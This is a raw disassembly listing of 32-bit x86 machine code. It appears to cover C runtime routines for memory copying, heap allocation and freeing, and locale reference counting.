  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
